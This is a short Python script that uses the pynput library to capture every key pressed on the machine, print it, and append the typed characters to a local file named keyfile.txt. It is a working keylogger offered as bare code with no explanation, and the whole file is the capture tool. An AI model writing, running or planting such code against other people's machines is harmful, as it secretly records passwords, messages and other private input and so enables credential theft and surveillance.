from pynput import keyboard

def key_Pressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error in getting the char")

if __name__=="__main__":
    listener = keyboard.Listener(on_press=key_Pressed)
    listener.start()
    input()